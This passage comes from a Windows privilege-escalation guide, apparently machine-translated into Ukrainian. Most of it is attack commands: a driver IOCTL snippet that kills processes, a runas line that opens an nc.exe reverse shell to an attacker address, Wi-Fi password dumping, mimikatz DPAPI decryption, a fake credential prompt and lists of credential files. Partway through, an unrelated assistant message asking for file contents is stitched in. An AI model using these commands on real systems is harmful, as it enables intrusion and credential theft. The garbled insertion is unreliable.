HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Заходи пом'якшення для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN при створенні device objects, які мають бути обмежені DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом на завершення процесу або повернення handle.
- Обмежуйте IOCTLs (access masks, METHOD_*, input validation) і розгляньте використання brokered models замість прямого kernel privileges.

Ідеї для виявлення для захисників
- Моніторте відкриття з user-mode підозрілих імен пристроїв (наприклад, \\ .\\amsdk*) та специфічні послідовності IOCTL, які вказують на зловживання.
- Запровадьте блоклист вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) та підтримуйте власні списки дозволених/заборонених.

## PATH DLL Hijacking

Якщо ви маєте **write permissions inside a folder present on PATH** ви можете перехопити DLL, яку завантажує процес, і **escalate privileges**.

Перевірте дозволи всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Для отримання додаткової інформації про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Мережа

### Шари
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте наявність інших відомих комп'ютерів, жорстко прописаних у hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте наявність **сервісів з обмеженим доступом** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Таблиця ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила брандмауера

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення тощо)**

Більше[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте root user, ви зможете прослуховувати будь-який порт (першого разу, коли ви використовуєте `nc.exe` для прослуховування порту, він через GUI запитає, чи слід дозволити `nc` у firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash як root, можна спробувати `--default-user root`

Ви можете дослідити файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows облікові дані

### Winlogon облікові дані
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault зберігає user credentials для серверів, вебсайтів та інших програм, до яких **Windows** може **автоматично входити від імені користувачів**. На перший погляд може здатися, що користувачі можуть зберігати свої Facebook credentials, Twitter credentials, Gmail credentials тощо, щоб автоматично входити через браузери. Але це не так.

Windows Vault зберігає credentials, які Windows може використовувати для автоматичного входу користувачів. Це означає, що будь-який **Windows application that needs credentials to access a resource** (сервер або вебсайт) **can make use of this Credential Manager** і Windows Vault, і може використовувати надані credentials замість того, щоб користувачі щоразу вводили ім'я користувача та пароль.

Якщо додатки не взаємодіють з Credential Manager, навряд чи вони зможуть використовувати credentials для конкретного ресурсу. Тож якщо ваш додаток хоче користуватися сховищем, він має якимось чином **communicate with the credential manager and request the credentials for that resource** з дефолтного сховища.

Використайте `cmdkey` щоб перелічити збережені credentials на машині.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Потім ви можете використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі викликається віддалений бінарний файл через SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` з наданим набором credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу, що mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), або модуль [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, що суттєво додає ентропії.

**DPAPI дозволяє шифрувати ключі за допомогою симетричного ключа, який походить від секретів входу користувача**. У випадках системного шифрування він використовує доменні автентифікаційні секрети системи.

Зашифровані RSA-ключі користувача при використанні DPAPI зберігаються в папці `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` означає користувацький [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Ключ DPAPI, що розташований разом із master key, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байт випадкових даних. (Важливо зазначити, що доступ до цієї папки обмежений — її вміст не можна перелічити за допомогою команди `dir` у CMD, хоча його можна переглянути через PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використовувати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`) щоб розшифрувати його.

**credentials files protected by the master password** зазвичай розташовані в:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Можна використати **mimikatz module** `dpapi::cred` з відповідним `/masterkey` для розшифрування.\
Можна **extract many DPAPI** **masterkeys** з **memory** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell облікові дані

**PowerShell credentials** часто використовуються для **scripting** та завдань автоматизації як спосіб зручного зберігання зашифрованих облікових даних. Ці облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп'ютері, де вони були створені.

Щоб **decrypt** PS облікові дані з файлу, що їх містить, можна зробити так:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-з'єднання

Ви можете знайти їх у `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Диспетчер облікових даних віддаленого робочого столу**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте модуль **Mimikatz** `dpapi::rdg` з відповідним `/masterkey` для **розшифровки будь-яких .rdg файлів`\
Ви можете **витягти багато DPAPI masterkeys** з пам'яті за допомогою модуля Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Користувачі часто використовують додаток StickyNotes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл знаходиться за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і завжди вартий пошуку та перевірки.

### AppCmd.exe

**Зверніть увагу, що для відновлення паролів з AppCmd.exe потрібно бути Administrator і працювати під High Integrity level.**\
**AppCmd.exe** знаходиться в директорії `%systemroot%\system32\inetsrv\`.\  
Якщо цей файл існує, то можливо, що деякі **credentials** були налаштовані і можуть бути **відновлені**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та Реєстр (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH-ключі хоста
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ключі в реєстрі

SSH приватні ключі можуть зберігатися всередині ключа реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася при завантаженні, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Здається, ця техніка більше не працює. Я спробував створити декілька ssh-ключів, додати їх за допомогою `ssh-add` і підключитися по ssh до машини. Реєстр HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час аутентифікації асиметричним ключем.

### Файли без нагляду
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM резервні копії
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Облікові дані хмари
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати кастомні локальні облікові записи адміністраторів на групі машин через Group Policy Preferences (GPP). Однак цей метод мав суттєві проблеми з безпекою. По-перше, Group Policy Objects (GPOs), які зберігаються як XML-файли в SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані AES256 з використанням публічно документованого ключа за замовчуванням, могли бути розшифровані будь-яким авторизованим користувачем. Це створювало серйозний ризик, оскільки могло дозволити користувачам отримати підвищені права.

Щоб зменшити цей ризик, була розроблена функція, яка сканує локально кешовані GPP-файли на наявність поля "cpassword", яке не порожнє. Знайшовши такий файл, функція розшифровує пароль і повертає користувацький PowerShell-об'єкт. Цей об'єкт містить деталі про GPP і розташування файлу, що допомагає в ідентифікації та усуненні вразливості.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN облікові дані
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Журнали
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запитати credentials

Ви завжди можете **попросити користувача ввести його credentials або навіть credentials іншого користувача**, якщо думаєте, що він може їх знати (зверніть увагу, що **прохання** клієнта безпосередньо надати **credentials** є дуже **ризикованим**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які раніше містили **паролі** у **відкритому тексті** або **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the file contents. Please paste the content of src/windows-hardening/windows-local-privilege-escalation/README.md (or provide the files to translate). Once you do, I'll translate the English text to Ukrainian, preserving all markdown/html tags, links, refs and code exactly as requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Також варто перевірити Bin на наявність credentials.

Щоб **відновити паролі**, збережені кількома програмами, ви можете скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Всередині реєстру

**Інші можливі ключі реєстру, що містять credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних (dbs), де зберігаються паролі від **Chrome or Firefox**.\
Також перевірте історію, закладки та улюблені браузерів — можливо деякі **паролі** збережено там.

Інструменти для витягування паролів з браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) — технологія, вбудована в операційну систему Windows, яка дозволяє взаємодію між програмними компонентами, написаними різними мовами. Кожен COM компонент ідентифікується через class ID (CLSID), і кожен компонент надає функціональність через один або кілька інтерфейсів, ідентифікованих interface IDs (IIDs).

COM-класи та інтерфейси визначені в реєстрі під **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface** відповідно. Цей розділ реєстру створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **default value**, що вказує на **DLL**, і значення з назвою **ThreadingModel**, яке може бути **Apartment (Single-Threaded)**, **Free (Multi-Threaded)**, **Both (Single or Multi)** або **Neutral (Thread Neutral)**.

![](<../../images/image (729).png>)

По суті, якщо ви зможете перезаписати будь-яку з DLL, яка буде виконуватися, ви можете escalate privileges, якщо ця DLL буде виконуватися іншим користувачем.

Щоб дізнатися, як нападники використовують COM Hijacking як persistence mechanism, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу з певною назвою**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Шукайте в реєстрі імена ключів та паролі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном для msf**. Я створив цей плагін, щоб **автоматично виконувати кожен metasploit POST module, який шукає credentials** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для витягнення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** та **паролі** кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявіть, що **процес, який працює як SYSTEM, відкриває новий процес** (`OpenProcess()`) з **full access**. Той самий процес **також створює новий процес** (`CreateProcess()`) **з low privileges, але наслідуючи всі відкриті handle-и головного процесу**.\
Якщо у вас є **full access до low privileged процесу**, ви можете отримати **відкритий handle на привілейований процес, створений** через `OpenProcess()`, і **інжектнути shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Сегменти спільної пам’яті, які називають **pipes**, дозволяють процесам обмінюватися даними й передавати їх.

Windows надає функціональність під назвою **Named Pipes**, яка дає змогу незв’язаним процесам обмінюватися даними, навіть через різні мережі. Це нагадує архітектуру client/server, де ролі визначені як **named pipe server** і **named pipe client**.

Коли дані надсилаються через pipe **client**-ом, **server**, що створив pipe, має можливість **прийняти ідентичність** клієнта, за умови наявності прав **SeImpersonate**. Виявлення **привілейованого процесу**, який спілкується через pipe, котрий ви можете імітувати, дає можливість **отримати вищі привілеї**, прийнявши ідентичність цього процесу, коли він взаємодіятиме з pipe, який ви встановили. Для інструкцій по виконанню такої атаки корисні гайди [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Також наступний інструмент дозволяє **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Різне

### Розширення файлів, які можуть виконувати код у Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Моніторинг командних рядків на наявність паролів**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, в деяких версіях Microsoft Windows можливо запустити термінал або будь-який інший процес, такий як "NT\AUTHORITY SYSTEM", від імені непривілейованого користувача.

